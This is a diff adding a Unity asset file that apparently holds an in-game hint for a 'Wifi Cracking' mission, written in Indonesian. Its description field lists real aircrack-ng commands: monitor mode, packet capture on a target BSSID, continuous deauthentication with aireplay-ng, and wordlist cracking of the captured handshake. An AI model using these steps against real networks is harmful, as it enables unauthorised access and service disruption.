@@ -1,0 +1,46 @@
+%YAML 1.1
+%TAG !u! tag:unity3d.com,2011:
+--- !u!114 &11400000
+MonoBehaviour:
+  m_ObjectHideFlags: 0
+  m_CorrespondingSourceObject: {fileID: 0}
+  m_PrefabInstance: {fileID: 0}
+  m_PrefabAsset: {fileID: 0}
+  m_GameObject: {fileID: 0}
+  m_Enabled: 1
+  m_EditorHideFlags: 0
+  m_Script: {fileID: 11500000, guid: f007193b616daaf499450919c036edb7, type: 3}
+  m_Name: 0_Hint_Wifi Cracking
+  m_EditorClassIdentifier: 
+  titleHint: 
+  imageHint: {fileID: 0}
+  descHint: '1. Buka software terminal
+
+    2. apt-get install aircrack-ng
+
+    3.
+    iwconfig
+
+    4. airmon-ng start wlan0
+
+    5. iwconfig
+
+    6. airodump-ng
+    wlan0mon
+
+    7. airodump-ng -w hack -c 97 -bssid 51:11:25:AB:A6:42
+
+    8.
+    aireplay-ng --deauth 0 -a 51:11:25:AB:A6:42 wlan0mon
+
+    9. ls
+
+    10. aircrack-ng
+    hack-01.cap -w wordlists.txt
+
+    11. Masukkan password wifi lalu klik connect
+
+    12.
+    airmon-ng stop wlan0mon
+
+    13. Buka log misi wifi cracking'
